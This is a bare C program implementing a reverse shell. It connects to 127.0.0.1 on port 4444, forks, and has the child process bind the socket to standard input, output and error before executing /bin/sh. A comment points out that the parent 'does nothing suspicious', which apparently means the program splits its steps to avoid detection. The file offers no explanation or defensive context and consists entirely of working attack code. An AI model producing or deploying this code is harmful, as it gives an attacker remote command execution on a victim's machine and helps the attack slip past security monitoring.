#include <stdio.h>
#include <unistd.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <stdlib.h>

int main() {
    int sock;
    struct sockaddr_in server;

    sock = socket(AF_INET, SOCK_STREAM, 0);
    server.sin_family = AF_INET;
    server.sin_port = htons(4444);
    inet_pton(AF_INET, "127.0.0.1", &server.sin_addr);

    // Parent does connect
    if (connect(sock, (struct sockaddr*)&server, sizeof(server)) < 0) {
        perror("connect failed");
        return 1;
    }

    pid_t pid = fork();

    if (pid < 0) {
        perror("fork failed");
        return 1;
    }

    if (pid == 0) {
        // CHILD: does dup2 + execve
        dup2(sock, 0);
        dup2(sock, 1);
        dup2(sock, 2);

        char *args[] = {"/bin/sh", NULL};
        execve("/bin/sh", args, NULL);

        perror("execve failed");
        exit(1);
    } else {
        // PARENT: does nothing suspicious after connect
        sleep(2);
    }

    return 0;
}